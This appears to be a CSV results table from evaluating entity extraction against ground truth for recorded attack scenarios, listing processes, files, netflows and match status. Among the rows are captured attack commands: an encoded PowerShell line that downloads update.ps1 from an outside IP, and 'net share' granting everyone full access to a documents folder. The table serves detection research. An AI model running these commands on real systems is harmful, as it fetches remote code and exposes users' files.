attack,gt_uuid,status,gt_type,gt_name,our_type,our_name,our_cmdline,type_match,name_match,mismatch_reason,resolved_uuid
fivedirections_e3_browser_0412,e20f7c55-319d-4af5-bc62-11317b9dec3c,direct,netflow,128.55.12.67:61082->135.84.161.202:80,netflow,128.55.12.67:61082->135.84.161.202:80,,1,1,,e20f7c55-319d-4af5-bc62-11317b9dec3c
fivedirections_e3_excel_0409,86371755-c67e-43fb-a2af-2feecded22ba,thread→process,process,None None,process,cmd.exe,"""cmd.exe""",1,1,,3e1c1557-0411-45d1-82a3-f981a37faf80
fivedirections_e3_excel_0409,d02980a5-44ac-47e2-8a9f-bf14c10a8d5e,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Desktop\\\\~$BoviaBenefitsOE.xlsm""}",file,Device\HarddiskVolume2\Users\admin\Desktop\~$BoviaBenefitsOE.xlsm,,1,1,,d02980a5-44ac-47e2-8a9f-bf14c10a8d5e
fivedirections_e3_excel_0409,4d884ac3-1123-40e3-a5de-03cc05c2e203,direct,process,"None \""C:\\Program Files (x86)\\Microsoft Office\\Office15\\WINWORD.EXE\"" /n \""C:\\Users\\admin\\Documents\\MissleAlert.rtf\"" /o \""\""",process,winword.exe,"""C:\Program Files (x86)\Microsoft Office\Office15\WINWORD.EXE"" /n ""C:\Users\admin\Documents\MissleAlert.rtf"" /o """"",1,0,"gt_exe=\""c:\\program",4d884ac3-1123-40e3-a5de-03cc05c2e203
fivedirections_e3_excel_0409,9fa60dbe-d055-4223-b807-8e400ecdf222,thread→process,process,None None,process,None,,1,1,,42bbefc0-ad77-428a-aa41-799788a526d3
fivedirections_e3_excel_0409,ffd02360-2b85-4e38-8f34-3241e4afa670,thread→process,process,None None,process,conhost.exe,\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1,1,1,,cdcf8c63-12cb-4227-8212-21c360db7dab
fivedirections_e3_excel_0409,eb4d8622-845b-44f8-a581-a2cfa2a3e219,thread→process,process,None None,process,svchost.exe,C:\WINDOWS\system32\svchost.exe -k DcomLaunch -p,1,1,,00529177-dc71-480d-ad65-2e2d26303026
fivedirections_e3_excel_0409,9cdcaa42-32fa-4b4c-bff6-e2f3ebf12aa9,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\mydocs""}",file,Device\HarddiskVolume2\Users\admin\Documents\mydocs,,1,1,,9cdcaa42-32fa-4b4c-bff6-e2f3ebf12aa9
fivedirections_e3_excel_0409,40b0e1f9-9e82-40c6-a67e-441df614cab4,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\mydocs""}",file,\Device\HarddiskVolume2\Users\admin\Documents\mydocs,,1,1,,40b0e1f9-9e82-40c6-a67e-441df614cab4
fivedirections_e3_excel_0409,b9a9fb5f-b199-4c69-8a34-13f344106820,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\mydocs\\\\""}",file,\Device\HarddiskVolume2\Users\admin\Documents\mydocs\,,1,0,path_diff,b9a9fb5f-b199-4c69-8a34-13f344106820
fivedirections_e3_excel_0409,437a617f-bf9c-402b-9ac1-74040e8f6a68,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\mydocs""}",file,C:\Users\admin\Documents\mydocs,,1,1,,437a617f-bf9c-402b-9ac1-74040e8f6a68
fivedirections_e3_excel_0409,40989dd5-c389-4c76-8435-8b6074f19659,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\ProgramData\\\\update.ps1""}",file,\Device\HarddiskVolume2\ProgramData\update.ps1,,1,1,,40989dd5-c389-4c76-8435-8b6074f19659
fivedirections_e3_excel_0409,9ed8a6dd-4421-49ef-952c-95345205919b,direct,process,None powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB,process,powershell.exe,powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUA,1,1,,9ed8a6dd-4421-49ef-952c-95345205919b
fivedirections_e3_excel_0409,c0f74d6f-1cae-496e-b280-7230cf4edce4,direct,file,"{""Device\\\\HarddiskVolume2\\\\ProgramData\\\\update.ps1""}",file,Device\HarddiskVolume2\ProgramData\update.ps1,,1,1,,c0f74d6f-1cae-496e-b280-7230cf4edce4
fivedirections_e3_excel_0409,747beaa2-4e2e-4eb5-9d15-bdab9391b84c,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\taskkill.exe""}",file,\Device\HarddiskVolume2\Windows\System32\taskkill.exe,,1,1,,747beaa2-4e2e-4eb5-9d15-bdab9391b84c
fivedirections_e3_excel_0409,d3fb71d4-6cd5-4d30-8cd7-ef82eeb5b5c8,direct,file,"{""C:\\\\ProgramData\\\\update.ps1""}",file,C:\ProgramData\update.ps1,,1,1,,d3fb71d4-6cd5-4d30-8cd7-ef82eeb5b5c8
fivedirections_e3_excel_0409,8ee116e4-fcfd-4934-8822-f14e8b9c45db,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\Document.rtf""}",file,Device\HarddiskVolume2\Users\admin\Documents\Document.rtf,,1,1,,8ee116e4-fcfd-4934-8822-f14e8b9c45db
fivedirections_e3_excel_0409,4b9a91ff-9531-4338-91f3-2f09168e423f,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\Document.rtf""}",file,C:\Users\admin\Documents\Document.rtf,,1,1,,4b9a91ff-9531-4338-91f3-2f09168e423f
fivedirections_e3_excel_0409,2a9fba61-0097-42e9-b093-ac97ffbf809c,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\KernelBase.dll""}",file,\Device\HarddiskVolume2\Windows\System32\KernelBase.dll,,1,1,,2a9fba61-0097-42e9-b093-ac97ffbf809c
fivedirections_e3_excel_0409,782f5774-7e01-44b8-989e-e2cfa54a0e0d,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\MissleAlert.rtf""}",file,Device\HarddiskVolume2\Users\admin\Documents\MissleAlert.rtf,,1,1,,782f5774-7e01-44b8-989e-e2cfa54a0e0d
fivedirections_e3_excel_0409,02edfe8d-ac2d-4b93-85f5-4da6a16f32ee,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\MissleAlert.rtf""}",file,C:\Users\admin\Documents\MissleAlert.rtf,,1,1,,02edfe8d-ac2d-4b93-85f5-4da6a16f32ee
fivedirections_e3_excel_0409,236258ac-bee3-4888-a2ec-7609ad28731f,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\MissleAlert.rtf""}",file,\Device\HarddiskVolume2\Users\admin\Documents\MissleAlert.rtf,,1,1,,236258ac-bee3-4888-a2ec-7609ad28731f
fivedirections_e3_excel_0409,b8ca5857-4c0f-4e3c-8cda-25f7107199db,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\Document.rtf""}",file,\Device\HarddiskVolume2\Users\admin\Documents\Document.rtf,,1,1,,b8ca5857-4c0f-4e3c-8cda-25f7107199db
fivedirections_e3_excel_0409,255e412f-efdc-4a34-aacb-878071c24533,thread→process,process,None None,process,msmpeng.exe,"""C:\ProgramData\Microsoft\Windows Defender\platform\4.12.17007.18022-0\MsMpEng.exe""",1,1,,cf274a26-147a-40e0-959c-bc9638550520
fivedirections_e3_excel_0409,3d0b2b2a-0262-4f64-8f99-6fca9f07b3db,direct,process,None taskkill  8744,process,taskkill.exe,taskkill  8744,1,1,,3d0b2b2a-0262-4f64-8f99-6fca9f07b3db
fivedirections_e3_excel_0409,e9983ea8-08ec-441a-a126-235061ceec80,thread→process,process,None None,process,taskkill.exe,taskkill  8744,1,1,,3d0b2b2a-0262-4f64-8f99-6fca9f07b3db
fivedirections_e3_excel_0409,64c725d4-119f-48d3-a320-edd5262c0a40,thread→process,process,None None,process,msmpeng.exe,"""C:\ProgramData\Microsoft\Windows Defender\platform\4.12.17007.18022-0\MsMpEng.exe""",1,1,,cf274a26-147a-40e0-959c-bc9638550520
fivedirections_e3_excel_0409,3305472c-15ec-4039-bd1e-880d6a616d19,thread→process,process,None None,process,searchprotocolhost.exe,"""C:\WINDOWS\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe258_ Global\UsGthrCtrlFltPipeMssGthrPipe258 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownL",1,1,,5a3b6144-89b6-4d6b-aadf-e9ff0fb54950
fivedirections_e3_excel_0409,ed63bf6b-0726-40af-bdb8-ea67be98b198,thread→process,process,None None,process,cmd.exe,"""cmd.exe""",1,1,,3e1c1557-0411-45d1-82a3-f981a37faf80
fivedirections_e3_excel_0409,440c2e9d-da7b-40c2-9ee6-5393463347b1,direct,process,"None \""C:\\WINDOWS\\system32\\SearchProtocolHost.exe\"" Global\\UsGthrFltPipeMssGthrPipe257_ Global\\UsGthrCtrlFltPipeMssGthrPipe257 1 -2147483646 \""Software\\Microsoft\\Windows Search\"" \""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\"" \""C:\\ProgramData\\Microsoft\\Search\\Data",process,searchprotocolhost.exe,"""C:\WINDOWS\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe257_ Global\UsGthrCtrlFltPipeMssGthrPipe257 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownL",1,0,"gt_exe=\""c:\\windows\\system32\\searchprotocolhost.exe\""",440c2e9d-da7b-40c2-9ee6-5393463347b1
fivedirections_e3_excel_0409,3e1c1557-0411-45d1-82a3-f981a37faf80,direct,process,"None \""cmd.exe\""",process,cmd.exe,"""cmd.exe""",1,0,"gt_exe=\""cmd.exe\",3e1c1557-0411-45d1-82a3-f981a37faf80
fivedirections_e3_excel_0409,2821ce71-3a60-48a3-83a7-a471bb383b4a,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin""}",file,Device\HarddiskVolume2\Users\admin,,1,1,,2821ce71-3a60-48a3-83a7-a471bb383b4a
fivedirections_e3_excel_0409,9d981c5b-6008-463d-853c-4462b6df7dfb,direct,process,None taskkill  /PID 8744 /F,process,taskkill.exe,taskkill  /PID 8744 /F,1,1,,9d981c5b-6008-463d-853c-4462b6df7dfb
fivedirections_e3_excel_0409,62ff1fea-01e1-4528-874f-5f0778288b6e,thread→process,process,None None,process,searchprotocolhost.exe,"""C:\WINDOWS\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe257_ Global\UsGthrCtrlFltPipeMssGthrPipe257 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownL",1,1,,440c2e9d-da7b-40c2-9ee6-5393463347b1
fivedirections_e3_excel_0409,f9d372b6-3686-4da3-8caa-e475b3811b8c,direct,file,"{""C:\\\\Windows\\\\System32\\\\taskkill.exe""}",file,C:\Windows\System32\taskkill.exe,,1,1,,f9d372b6-3686-4da3-8caa-e475b3811b8c
fivedirections_e3_excel_0409,b0ccb7eb-daf0-41e1-9997-4b3478e76798,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin""}",file,\Device\HarddiskVolume2\Users\admin,,1,1,,b0ccb7eb-daf0-41e1-9997-4b3478e76798
fivedirections_e3_excel_0409,55394081-0a7c-4e8e-8c2f-5035f7e370b8,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\WINDOWS\\\\system32\\\\taskkill.exe.Config""}",file,\Device\HarddiskVolume2\WINDOWS\system32\taskkill.exe.Config,,1,1,,55394081-0a7c-4e8e-8c2f-5035f7e370b8
fivedirections_e3_excel_0409,4c1954fb-0316-485d-904b-31344d6649da,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\trains.rtf""}",file,Device\HarddiskVolume2\Users\admin\Documents\trains.rtf,,1,1,,4c1954fb-0316-485d-904b-31344d6649da
fivedirections_e3_excel_0409,23949574-24d4-4089-854f-8bb934a2934f,direct,file,{taskkill.exe},file,taskkill.exe,,1,1,,23949574-24d4-4089-854f-8bb934a2934f
fivedirections_e3_excel_0409,53b52c96-4521-47cb-92e9-8e5fdf99d29d,direct,file,"{""Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\taskkill.exe""}",file,Device\HarddiskVolume2\Windows\System32\taskkill.exe,,1,1,,53b52c96-4521-47cb-92e9-8e5fdf99d29d
fivedirections_e3_excel_0409,10c50106-71f5-4a17-adc3-4b54787bb8fc,direct,file,"{""Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\en-US\\\\taskkill.exe.mui""}",file,Device\HarddiskVolume2\Windows\System32\en-US\taskkill.exe.mui,,1,1,,10c50106-71f5-4a17-adc3-4b54787bb8fc
fivedirections_e3_excel_0409,3ea7fb5e-0598-4974-9600-0cb44abb35ba,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\trains.rtf""}",file,\Device\HarddiskVolume2\Users\admin\Documents\trains.rtf,,1,1,,3ea7fb5e-0598-4974-9600-0cb44abb35ba
fivedirections_e3_excel_0409,0bfe17f6-9c70-44e6-aae6-3251859f22c7,direct,file,"{""C:\\\\Windows\\\\System32\\\\en-US\\\\taskkill.exe.mui""}",file,C:\Windows\System32\en-US\taskkill.exe.mui,,1,1,,0bfe17f6-9c70-44e6-aae6-3251859f22c7
fivedirections_e3_excel_0409,c3f96165-d4d5-458a-bbbe-84a71e1d444f,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\en-US\\\\taskkill.exe.mui""}",file,\Device\HarddiskVolume2\Windows\System32\en-US\taskkill.exe.mui,,1,1,,c3f96165-d4d5-458a-bbbe-84a71e1d444f
fivedirections_e3_excel_0409,9e8f6990-153b-4a4b-8499-3aaac2008e5b,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\trains.rtf""}",file,C:\Users\admin\Documents\trains.rtf,,1,1,,9e8f6990-153b-4a4b-8499-3aaac2008e5b
fivedirections_e3_excel_0409,dcd013e9-7010-4a51-9fec-8b653c981c7c,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\AppData\\\\Roaming\\\\Microsoft\\\\Excel\\\\BoviaBenefitsOE306586132161491315\\\\BoviaBenefitsOE.xlsm.lnk""}",file,\Device\HarddiskVolume2\Users\admin\AppData\Roaming\Microsoft\Excel\BoviaBenefitsOE306586132161491315\BoviaBenefitsOE.xlsm.lnk,,1,1,,dcd013e9-7010-4a51-9fec-8b653c981c7c
fivedirections_e3_excel_0409,fe198927-f937-4fd2-b6e6-041c3d47017b,direct,process,None net  share mydocs=C:\\Users\\admin\\Documents\\mydocs ,process,net.exe,net  share mydocs=C:\Users\admin\Documents\mydocs ,1,1,,fe198927-f937-4fd2-b6e6-041c3d47017b
fivedirections_e3_excel_0409,15da2c71-74c2-40f1-9d3e-27f2f098c921,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\AppData\\\\Roaming\\\\Microsoft\\\\Excel\\\\BoviaBenefitsOE306586132161491315\\\\BoviaBenefitsOE.xlsm.lnk""}",file,Device\HarddiskVolume2\Users\admin\AppData\Roaming\Microsoft\Excel\BoviaBenefitsOE306586132161491315\BoviaBenefitsOE.xlsm.lnk,,1,1,,15da2c71-74c2-40f1-9d3e-27f2f098c921
fivedirections_e3_excel_0409,58da6981-e3a9-4f28-bfca-c27f66331b20,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\MissleAlert.rtf:Zone.Identifier""}",file,\Device\HarddiskVolume2\Users\admin\Documents\MissleAlert.rtf:Zone.Identifier,,1,1,,58da6981-e3a9-4f28-bfca-c27f66331b20
fivedirections_e3_excel_0409,54937d7e-b2f2-4a1e-b631-8e946174793d,direct,process,None C:\\WINDOWS\\system32\\net1  share mydocs=C:\\Users\\admin\\Documents\\mydocs ,process,net1.exe,C:\WINDOWS\system32\net1  share mydocs=C:\Users\admin\Documents\mydocs ,1,0,gt_exe=c:\\windows\\system32\\net1,54937d7e-b2f2-4a1e-b631-8e946174793d
fivedirections_e3_excel_0409,34da6e7f-067d-4fcb-af1f-014f36d3af7b,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\BoviaBenefitsOE.xlsm""}",file,Device\HarddiskVolume2\Users\admin\Documents\BoviaBenefitsOE.xlsm,,1,1,,34da6e7f-067d-4fcb-af1f-014f36d3af7b
fivedirections_e3_excel_0409,845b7c61-4397-4e0d-a23a-a22bde2ca4d7,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\BoviaBenefitsOE.xlsm""}",file,\Device\HarddiskVolume2\Users\admin\Documents\BoviaBenefitsOE.xlsm,,1,1,,845b7c61-4397-4e0d-a23a-a22bde2ca4d7
fivedirections_e3_excel_0409,92161288-8270-4b8e-93b5-e9e81140c04c,direct,process,"None net  share mydocs=C:\\Users\\admin\\Documents\\mydocs /grant:everyone,FULL",process,net.exe,"net  share mydocs=C:\Users\admin\Documents\mydocs /grant:everyone,FULL",1,1,,92161288-8270-4b8e-93b5-e9e81140c04c
fivedirections_e3_excel_0409,410fc7cc-fbea-4f03-866c-b48f9d141521,direct,file,"{""Device\\\\HarddiskVolume2""}",file,Device\HarddiskVolume2,,1,1,,410fc7cc-fbea-4f03-866c-b48f9d141521
fivedirections_e3_excel_0409,19def44f-36d5-43d3-9d1e-eb80ad06c22b,direct,file,"{""C:\\\\Users\\\\admin\\\\AppData\\\\Roaming\\\\Microsoft\\\\Excel\\\\BoviaBenefitsOE306586132161491315\\\\BoviaBenefitsOE.xlsm.lnk""}",file,C:\Users\admin\AppData\Roaming\Microsoft\Excel\BoviaBenefitsOE306586132161491315\BoviaBenefitsOE.xlsm.lnk,,1,1,,19def44f-36d5-43d3-9d1e-eb80ad06c22b
